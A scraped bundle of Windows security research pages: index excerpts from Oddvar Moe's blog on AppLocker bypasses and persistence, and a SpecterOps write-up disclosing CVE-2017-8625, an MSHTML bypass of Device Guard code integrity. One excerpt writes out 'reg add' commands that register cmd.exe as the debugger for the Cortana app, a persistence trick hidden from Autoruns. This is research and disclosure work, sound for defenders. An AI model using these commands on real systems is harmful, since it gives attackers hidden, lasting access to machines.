=== Content from oddvar.moe_73f4e938_20250126_054311.html ===

[Skip to content](#content)
Menu

* [Home](/)
* [About](https://oddvar.moe/about/)
* [Presentations](https://oddvar.moe/presentations/)
* [Articles](https://oddvar.moe/articles/)
* [AppLocker Case study](https://oddvar.moe)
  + [AppLocker – Case study – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
  + [AppLocker – Case study – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
  + [AppLocker – Hardening – Part 1](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
  + [AppLocker – Hardening – Part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
  + [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)
  + [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)
  + [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)
  + [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)
  + [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Previous Blogs](https://oddvar.moe)
  + [MSItpros – Waybackmachine](https://web.archive.org/web/20201101151155/http%3A//msitpros.com/)
  + [moe.am – Waybackmachine](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)

# [Oddvar Moe's Blog](https://oddvar.moe/)

Notes from My adventures with Windows security

## [A small discovery about AppLocker](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)

Posted on [29 May 2019](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

While I was prepping for a session a while back I made a a little special discovery about AppLocker. Turns out that the files that AppLocker uses under C:\Windows\System32\AppLocker can be used in many cases to bypass a Default AppLocker ruleset. When a machine is deployed and the first user logs in, that user will … [Continue reading A small discovery about AppLocker →](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)

Tagged [ADS](https://oddvar.moe/tag/ads/), [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [research](https://oddvar.moe/tag/research/)[1 Comment](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/#comments)

## [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)

Posted on [1 Feb 20191 Feb 2019](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

I thought it would be useful to have a blog post about two different techniques you can use to bypass AppLocker if you are an admin on a host that has AppLocker enabled. The first technique that uses the GUI was briefly discussed in a tweet I posted a while back: https://twitter.com/Oddvarmoe/status/996147947975962624  My goal with this … [Continue reading Bypassing AppLocker as an admin →](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/)[4 Comments](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/#comments)

## [Doing the PentesterAcademy Red Team Lab](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/)

Posted on [25 Oct 201825 Oct 2018](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

This is my review of the Pentester Academy Red Team Lab. I got the possibility to try out the Red Team Lab (Thanks Nikhil Mittal) and I wanted to write my experiences with it. This was a lot of fun and I learned a lot of stuff along the road. It started out with a … [Continue reading Doing the PentesterAcademy Red Team Lab →](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/)

Tagged [hacking](https://oddvar.moe/tag/hacking/), [red teaming](https://oddvar.moe/tag/red-teaming/)[Leave a comment](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/#respond)

## [%Temp%orary Constrained Language mode in AppLocker](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/)

Posted on [6 Oct 2018](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Done as a normal user without admin privs Change %TEMP%/%TMP% to point to a location that allows execution of scripts defined by AppLocker Start Powershell with the new environment variables that you set for %TEMP%/%TMP% and profit! Background This blogpost covers a technique I discovered when digging further into AppLocker to bypass Powershell Constrained … [Continue reading %Temp%orary Constrained Language mode in AppLocker →](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [CLM](https://oddvar.moe/tag/clm/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[3 Comments](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/#comments)

## [TrustedSec+Oddvar=OH YEAH!](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/)

Posted on [5 Oct 2018](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

As I announced at DerbyCon on stage during my #LOLBins talk, I have now started to work for TrustedSec. To me this is really huge and I truly feel lucky to be a part of such an amazing team of talented people. Right before my summer vacation this year, me and some of my former … [Continue reading TrustedSec+Oddvar=OH YEAH! →](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/)

Tagged [Job](https://oddvar.moe/tag/job/), [security](https://oddvar.moe/tag/security/), [TrustedSec](https://oddvar.moe/tag/trustedsec/)[Leave a comment](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/#respond)

## [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)

Posted on [28 Sep 2018](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

This is just a quick blogpost about a thing I forgot to write about a long time ago. One issue with AppLocker is that when someone gets admin access on a box they can create local AppLocker rules that will be combined with the Group Policy AppLocker rules. This is explained in this tweet here: https://twitter.com/Oddvarmoe/status/996147947975962624 … [Continue reading AppLocker – Making sure that local rules are removed →](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[2 Comments](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/#comments)

## [Persistence using Universal Windows Platform apps (APPX)](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/)

Posted on [6 Sep 20187 Sep 2018](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Persistence can be achieved with Appx/UWP apps using the debugger options. This technique will not be visible by Autoruns. Two different approaches exists (registry keys). Listed below are the two techniques for two different apps that starts at logon: Cortana app: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\Microsoft.Windows.Cortana\_1.10.7.17134\_neutral\_neutral\_cw5n1h2txyewy /d "C:\windows\system32\cmd.exe" OR reg add HKCU\Software\Classes\ActivatableClasses\Package\Microsoft.Windows.Cortana\_1.10.7.17134\_neutral\_neutral\_cw5n1h2txyewy\DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca /v DebugPath /d "C:\windows\system32\cmd.exe" … [Continue reading Persistence using Universal Windows Platform apps (APPX) →](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/)

Tagged [autoruns](https://oddvar.moe/tag/autoruns/), [bypass](https://oddvar.moe/tag/bypass/), [hacking](https://oddvar.moe/tag/hacking/), [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[4 Comments](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/#comments)

## [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)

Posted on [27 Jul 2018](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

A thing I see a lot is that AppLocker is used to "protect" servers and prevent admins from doing certain things. In this post I want to go over what sort of security this gives so that everyone can see Pros and Cons. A thing to remember is that an administrator has all the rights … [Continue reading AppLocker for admins – Does it work? →](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[1 Comment](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/#comments)

## [Another way to get to a system shell – Assistive Technology](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/)

Posted on [23 Jul 201825 Jul 2018](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Manipulate HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\magnifier - StartExe to run other binary when pressing WinKey and plus to zoom. Can load binary from Webdav and also start webbrowser and browse to desired link Runs command as system during UAC prompt and logon screen   I have thought a while about this blogpost and finally had some time to … [Continue reading Another way to get to a system shell – Assistive Technology →](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/)

Tagged [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/)[4 Comments](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/#comments)

## [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)

Posted on [14 May 201814 May 2018](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

I wanted to try and see if I was able to use AppLocker to only allow needed files (Real whitelisting). Normally what you would do when setting up AppLocker is that you would start out by trusting something. This something could either be everything under C:\windows and c:\programfiles, or it could be every file that … [Continue reading Real whitelisting attempt using AppLocker →](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/)[Leave a comment](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/#respond)

## Posts navigation

[Older posts](https://oddvar.moe/page/2/)

* [Facebook](https://www.facebook.com/oddvarmoe)
* [LinkedIn](https://www.linkedin.com/in/oddvarmoe/)
* [Twitter](http://www.twitter.com/oddvarmoe)

Search for:

[Website Powered by WordPress.com](https://wordpress.com/?ref=footer_custom_powered).

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)

  Join 41 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2019%252F05%252F29%252Fa-small-discovery-about-applocker%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2019%252F05%252F29%252Fa-small-discovery-about-applocker%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://oddvar.moe)
  + [View site in Reader](https://wordpress.com/read/feeds/74916725)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from posts.specterops.io_09fd684d_20250125_033509.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F3946536c6442&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# UMCI vs Internet Explorer: Exploring CVE-2017–8625

[![Matt Nelson](https://miro.medium.com/v2/resize:fill:88:88/0*6mGXmQSDMYyKuVUK.jpg)](https://medium.com/%40enigma0x3?source=post_page---byline--3946536c6442--------------------------------)[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:48:48/1*D-FDlfkqivRBQZoESrwtqw.png)](https://posts.specterops.io/?source=post_page---byline--3946536c6442--------------------------------)

[Matt Nelson](https://medium.com/%40enigma0x3?source=post_page---byline--3946536c6442--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1bb43103a9a9&operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&user=Matt+Nelson&userId=1bb43103a9a9&source=post_page-1bb43103a9a9--byline--3946536c6442---------------------post_header-----------)

Published in[Posts By SpecterOps Team Members](https://posts.specterops.io/?source=post_page---byline--3946536c6442--------------------------------)·3 min read·Aug 24, 2017

--

1

Listen

Share

In the recent months, I have spent some time digging into Device Guard and how User Mode Code Integrity (UMCI) is implemented. If you aren’t familiar with Device Guard, you can read more about it [here](https://docs.microsoft.com/en-us/windows/device-security/device-guard/device-guard-deployment-guide). Normally, UMCI prevents unapproved binaries from executing, restricts the Windows Scripting Host, and places PowerShell in [Constrained Language mode](https://technet.microsoft.com/en-us/library/dn433292.aspx). This makes obtaining code execution on a system fairly challenging. This post is going to highlight bypassing User Mode Code Integrity to instantiate objects that are normally blocked.

This bug was fixed in the August 2017 Patch Tuesday release under [CVE-2017–8625](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8625). The patch fixed two different techniques as both of them abuse the fact that MSHTML isn’t enlightened. The other technique abused Microsoft Compiled HTML Help files (CHMs). This was blogged about by [@Oddvarmoe](https://twitter.com/Oddvarmoe) and you can read more about that here: <https://msitpros.com/?p=3909>

As I mentioned above, the root cause of the bug was that MSHTML wasn’t enlightened in the context of UMCI. This essentially means that Device Guard’s UMCI component didn’t restrict MSHTML and simply let it execute everything with assumed “Full Trust.” Due to this, Internet Explorer permitted loading restricted objects. How, you might ask? The answer lies with Internet Explorer’s ability to interface with ActiveX and COM components =)

For example, the below HTML file will use a script tag to run some JScript. UMCI normally blocks instantiation of this object (and just about every other one). As a PoC, I just instantiated WScript.Shell and invoked the “Run” method to demonstrate I could instantiate a blocked object and invoke one of its methods.

![]()

HTML with script tag to execute jscript

As you can see below, “WScript.Shell” was blocked from instantiating via UMCI. Immediately following that, we instantiate “WScript.Shell” again via the HTML file and then start “calc.exe” via the “Run” method:

![]()

Internet Explorer loading unapproved object and executing a method

Since MSHTML didn’t conform to the same restrictions as other OS components, the WScript.Shell object was permitted to load and the run method was freely accessible.

It should be noted that Internet Explorer does apply zone security to prevent automatic execution of ActiveX controls via HTML. When opened, the user will see two prompts, one from IE asking permission to enable the ActiveX content and another security warning alerting the user that the content might be malicious. If an attacker is on a system but doesn’t have unsigned code execution (see [WMImplant](https://github.com/ChrisTruncer/WMImplant)), all it takes is two User Hive registry changes to temporarily disable the ActiveX alerting, allowing for silent unsigned code-execution. Those two changes look like this:

![]()

Registry changes to allow automatic ActiveX activation

Most UMCI bypasses are serviceable bugs per Microsoft, so be sure to send those over to secure@microsoft.com if you like CVEs =)

With CVE-2017–8625 issued, ActiveX/COM controls are no longer able to be loaded as Internet Explorer is now enlightened. This hopefully makes MSHTML bypasses a bit harder to find =)

Disclosure timeline:

12/13/2016: Report submitted to secure@microsoft.com 03/2017: Fix was pushed into RS1 (Creators Update)

08/08/2017: RS1 fix was back ported; CVE-2017–8625 issued

*Originally published at* [*enigma0x3.net*](https://enigma0x3.net/2017/08/24/umci-vs-internet-explorer-exploring-cve-2017-8625/) *on August 24, 2017.*

[Security](https://medium.com/tag/security?source=post_page-----3946536c6442--------------------------------)[Device Guard](https://medium.com/tag/device-guard?source=post_page-----3946536c6442--------------------------------)[Research](https://medium.com/tag/research?source=post_page-----3946536c6442--------------------------------)[Umci](https://medium.com/tag/umci?source=post_page-----3946536c6442--------------------------------)[Bypass](https://medium.com/tag/bypass?source=post_page-----3946536c6442--------------------------------)

--

--

1

[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:96:96/1*D-FDlfkqivRBQZoESrwtqw.png)](https://posts.specterops.io/?source=post_page---post_publication_info--3946536c6442--------------------------------)[![Posts By SpecterOps Team Members](https://miro.medium.com/v2/resize:fill:128:128/1*D-FDlfkqivRBQZoESrwtqw.png)](https://posts.specterops.io/?source=post_page---post_publication_info--3946536c6442--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&collection=Posts+By+SpecterOps+Team+Members&collectionId=f05f8696e3cc&source=post_page---post_publication_info--3946536c6442---------------------follow_profile-----------)[## Published in Posts By SpecterOps Team Members](https://posts.specterops.io/?source=post_page---post_publication_info--3946536c6442--------------------------------)[4.93K Followers](/followers?source=post_page---post_publication_info--3946536c6442--------------------------------)·[Last published 1 day ago](/insurance-companies-can-reduce-risk-with-attack-path-management-d6afa0ba1f5a?source=post_page---post_publication_info--3946536c6442--------------------------------)

Posts from SpecterOps team members on various topics relating information security

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Fspecter-ops-posts&operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&collection=Posts+By+SpecterOps+Team+Members&collectionId=f05f8696e3cc&source=post_page---post_publication_info--3946536c6442---------------------follow_profile-----------)[![Matt Nelson](https://miro.medium.com/v2/resize:fill:96:96/0*6mGXmQSDMYyKuVUK.jpg)](https://medium.com/%40enigma0x3?source=post_page---post_author_info--3946536c6442--------------------------------)[![Matt Nelson](https://miro.medium.com/v2/resize:fill:128:128/0*6mGXmQSDMYyKuVUK.jpg)](https://medium.com/%40enigma0x3?source=post_page---post_author_info--3946536c6442--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1bb43103a9a9&operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&user=Matt+Nelson&userId=1bb43103a9a9&source=post_page-1bb43103a9a9--post_author_info--3946536c6442---------------------follow_profile-----------)[## Written by Matt Nelson](https://medium.com/%40enigma0x3?source=post_page---post_author_info--3946536c6442--------------------------------)[1.5K Followers](https://medium.com/%40enigma0x3/followers?source=post_page---post_author_info--3946536c6442--------------------------------)·[56 Following](https://medium.com/%40enigma0x3/following?source=post_page---post_author_info--3946536c6442--------------------------------)

Red Teamer | Security Researcher | Enjoys abusing features | Tweets are my own | <http://github.com/enigma0x3>

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F1bb43103a9a9&operation=register&redirect=https%3A%2F%2Fposts.specterops.io%2Fumci-vs-internet-explorer-exploring-cve-2017-8625-3946536c6442&user=Matt+Nelson&userId=1bb43103a9a9&source=post_page-1bb43103a9a9--post_author_info--3946536c6442---------------------follow_profile-----------)
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----3946536c6442--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----3946536c6442--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----3946536c6442--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3946536c6442--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----3946536c6442--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----3946536c6442--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3946536c6442--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3946536c6442--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----3946536c6442--------------------------------)[Teams](https://medium.com/business?source=post_page-----3946536c6442--------------------------------)



=== Content from oddvar.moe_4de325d6_20250126_054315.html ===

[Skip to content](#content)
Menu

* [Home](/)
* [About](https://oddvar.moe/about/)
* [Presentations](https://oddvar.moe/presentations/)
* [Articles](https://oddvar.moe/articles/)
* [AppLocker Case study](https://oddvar.moe)
  + [AppLocker – Case study – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
  + [AppLocker – Case study – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
  + [AppLocker – Hardening – Part 1](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
  + [AppLocker – Hardening – Part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
  + [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)
  + [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)
  + [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)
  + [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)
  + [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Previous Blogs](https://oddvar.moe)
  + [MSItpros – Waybackmachine](https://web.archive.org/web/20201101151155/http%3A//msitpros.com/)
  + [moe.am – Waybackmachine](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)

[Oddvar Moe's Blog](https://oddvar.moe/)

Notes from My adventures with Windows security

# Author: Oddvar Moe [MVP]

## [A small discovery about AppLocker](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)

Posted on [29 May 2019](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

While I was prepping for a session a while back I made a a little special discovery about AppLocker. Turns out that the files that AppLocker uses under C:\Windows\System32\AppLocker can be used in many cases to bypass a Default AppLocker ruleset. When a machine is deployed and the first user logs in, that user will … [Continue reading A small discovery about AppLocker →](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/)

Tagged [ADS](https://oddvar.moe/tag/ads/), [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [research](https://oddvar.moe/tag/research/)[1 Comment](https://oddvar.moe/2019/05/29/a-small-discovery-about-applocker/#comments)

## [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)

Posted on [1 Feb 20191 Feb 2019](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

I thought it would be useful to have a blog post about two different techniques you can use to bypass AppLocker if you are an admin on a host that has AppLocker enabled. The first technique that uses the GUI was briefly discussed in a tweet I posted a while back: https://twitter.com/Oddvarmoe/status/996147947975962624  My goal with this … [Continue reading Bypassing AppLocker as an admin →](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/)[4 Comments](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/#comments)

## [Doing the PentesterAcademy Red Team Lab](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/)

Posted on [25 Oct 201825 Oct 2018](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

This is my review of the Pentester Academy Red Team Lab. I got the possibility to try out the Red Team Lab (Thanks Nikhil Mittal) and I wanted to write my experiences with it. This was a lot of fun and I learned a lot of stuff along the road. It started out with a … [Continue reading Doing the PentesterAcademy Red Team Lab →](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/)

Tagged [hacking](https://oddvar.moe/tag/hacking/), [red teaming](https://oddvar.moe/tag/red-teaming/)[Leave a comment](https://oddvar.moe/2018/10/25/doing-the-pentesteracademy-red-team-lab/#respond)

## [%Temp%orary Constrained Language mode in AppLocker](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/)

Posted on [6 Oct 2018](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Done as a normal user without admin privs Change %TEMP%/%TMP% to point to a location that allows execution of scripts defined by AppLocker Start Powershell with the new environment variables that you set for %TEMP%/%TMP% and profit! Background This blogpost covers a technique I discovered when digging further into AppLocker to bypass Powershell Constrained … [Continue reading %Temp%orary Constrained Language mode in AppLocker →](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [bypass](https://oddvar.moe/tag/bypass/), [CLM](https://oddvar.moe/tag/clm/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[3 Comments](https://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/#comments)

## [TrustedSec+Oddvar=OH YEAH!](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/)

Posted on [5 Oct 2018](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

As I announced at DerbyCon on stage during my #LOLBins talk, I have now started to work for TrustedSec. To me this is really huge and I truly feel lucky to be a part of such an amazing team of talented people. Right before my summer vacation this year, me and some of my former … [Continue reading TrustedSec+Oddvar=OH YEAH! →](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/)

Tagged [Job](https://oddvar.moe/tag/job/), [security](https://oddvar.moe/tag/security/), [TrustedSec](https://oddvar.moe/tag/trustedsec/)[Leave a comment](https://oddvar.moe/2018/10/05/trustedsecoddvaroh-yeah/#respond)

## [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)

Posted on [28 Sep 2018](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

This is just a quick blogpost about a thing I forgot to write about a long time ago. One issue with AppLocker is that when someone gets admin access on a box they can create local AppLocker rules that will be combined with the Group Policy AppLocker rules. This is explained in this tweet here: https://twitter.com/Oddvarmoe/status/996147947975962624 … [Continue reading AppLocker – Making sure that local rules are removed →](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[2 Comments](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/#comments)

## [Persistence using Universal Windows Platform apps (APPX)](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/)

